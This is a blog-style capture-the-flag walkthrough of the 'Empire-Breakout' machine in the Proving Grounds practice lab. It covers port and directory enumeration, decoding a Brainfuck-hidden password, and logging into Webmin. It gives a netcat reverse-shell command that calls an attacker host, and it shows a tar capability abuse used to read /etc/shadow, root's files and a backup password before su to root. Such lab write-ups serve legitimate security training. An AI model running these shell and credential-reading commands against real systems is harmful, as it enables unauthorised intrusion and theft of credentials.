---
layout: post
title: 'Proving Grounds Labs: Empire-Breakout Walkthrough'
date: 2023-03-03 15:39 +0800
tags: [CTF]
categories: [OffsecLabs]
---


# Introduction

Easy machine from Proving Grounds Labs (FREE), basic enumeration, decryption and linux capability privsec. 

## Nmap

First we start with Nmap scan as we can see 3 ports are open 80, 10000, 20000. on oirt 80 there is a default apache page and rest of 2 ports are running MiniServ service if we can get username and password we will get shell for sure. I alos did all ports scan but didnt got anything but same result, so lets move further.

```bash
> nmap -sC -sV -T4 192.168.173.238 -oN nmap/scan_1

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-03 13:30 IST
Nmap scan report for 192.168.173.238
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
10000/tcp open  http    MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http    MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
|_http-server-header: MiniServ/1.830

```

## Web Directory BruteForce

nothing interesting here, but lets check sourcecode of index.html page which is the default apache page on port 80

```bash
> dirsearch -u http://192.168.173.238

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/192.168.173.238/-_23-03-03_15-05-00.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-03-03_15-05-00.log

Target: http://192.168.173.238/

[15:05:00] Starting: 
[15:05:35] 200 -   11KB - /index.html
[15:05:39] 301 -  319B  - /manual  ->  http://192.168.173.238/manual/
[15:05:39] 200 -  676B  - /manual/index.html


```

## Decoding


```vim
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->

Decoded: ".2uqPEfj3D<P'a-3"

```

after schrolling down little bit i we get one comment, and somthing is encrypted here which is brainfuck encryption les decode this with any online decode and we get one password '***********', now we got 2 login forms and a password we try to login in both forms, on port 20000 we can login as "cyber" user. 

## Shell

now this is very simple just click on shell icon and web shell GUI will open run any reverse shell command and get a shell on you machine and stabalize. I used simple netcat shell.



```bash

# ON TARGET
$ nc <attacker-ip> <attacker-port> -e /bin/bash

# ON attacker machine

$ rlwrap nc -lvnp <port>

```

## ROOT 


```bash

cyber@breakout:~$ ls ls -la tar
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
#to check capablities
cyber@breakout:~$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```


After getting shell we can read user flag, no les get to root, there is a tar binary in our home directory and if we check capablities we can see tar binary, in this we can try to read /etc/shadow. 

1. compress /etc/shadow to tar
2. get .tar file in current directory 
3. extarct .tar and read shadow

ezz :)

```bash

cyber@breakout:~$ ls ls
ls
local.txt  tar
cyber@breakout:~$ ./tar -cvf shadow.tar /etc/shadow
cyber@breakout:~$ ls
local.txt  shadow.tar  tar
cyber@breakout:~$ tar -xf shadow.tar
cyber@breakout:~$ ls
etc  local.txt  shadow.tar  tar
cyber@breakout:~$ cat etc/shadow
root:$y$j9T$eJzu0TYuqGwZThJJzbP6o.$Xs23PV9/...
daemon:*:18919:0:99999:7:::
bin:*:18919:0:99999:7:::
sys:*:18919:0:99999:7:::
sync:*:18919:0:99999:7:::
games:*:18919:0:99999:7:::
man:*:18919:0:99999:7:::
lp:*:18919:0:99999:7:::
mail:*:18919:0:99999:7:::
....

```
and we can read root files now, so les read root flag now but i dont know the name of the file in which flag is stored ;) so les compress whole root directory ezz 

```bash

cyber@breakout:~$ ./tar -cvf root.tar /root
./tar -cvf root.tar /root
/root/
/root/.tmp/
/root/.spamassassin/
/root/.bash_history
/root/.profile
/root/.bashrc
/root/.usermin/
/root/.usermin/procmail/
/root/.usermin/mailbox/
/root/.usermin/mailbox/dsnreplies.pag
/root/.usermin/mailbox/dsnreplies.dir
/root/.usermin/mailbox/delreplies.dir
/root/.usermin/mailbox/delreplies.pag
/root/.usermin/spam/
/root/.usermin/filter/
/root/.local/
/root/.local/share/
/root/.local/share/nano/
/root/proof.txt
cyber@breakout:~$ tar -xf root.tar
tar -xf root.tar
cyber@breakout:~$ ls root/
ls root/
proof.txt
cyber@breakout:~$ cat root/proof.txt
cat root/proof.txt
a2d********fb

```

and we got the root flag but wait we need root shell, les read root users bash_history file and as we can see there is a .bak file in backups directory but only root user can read that, but wait we can read :) with tar les compress that .bak file.

```bash

cyber@breakout:~/root$ cat .bash_history
cat .bash_history
clear
nano /var/backups/.old_pass.bak 
cat /var/backups/.old_pass.bak 
chmod 600 /var/backups/.old_pass.bak
ls -la
clear
cd ../var/backups/
 .......
 
```

```bash

cyber@breakout:~$ ./t./tar -cvf lol.tar /var/backups/.old_pass.bak
./tar -cvf lol.tar /var/backups/.old_pass.bak
/var/backups/.old_pass.bak
cyber@breakout:~$ tar -xf lol.tar
tar -xf lol.tar
cyber@breakout:~$ ls
ls
etc  local.txt  lol.tar  root  root.tar  shadow.tar  tar  var
cyber@breakout:~$ cat var/backups/.old_pass.bak
cat var/backups/.old_pass.bak
"Ts********X(=~h"


```

and we got one more password les su to root user with this password 

```bash

cyber@breakout:~$ su su root
su root
Password: "Ts********X(=~h"

root@breakout:/home/cyber# cd    cd
cd
root@breakout:~# whoamiwhoami
whoami
root

```

and we are root :) 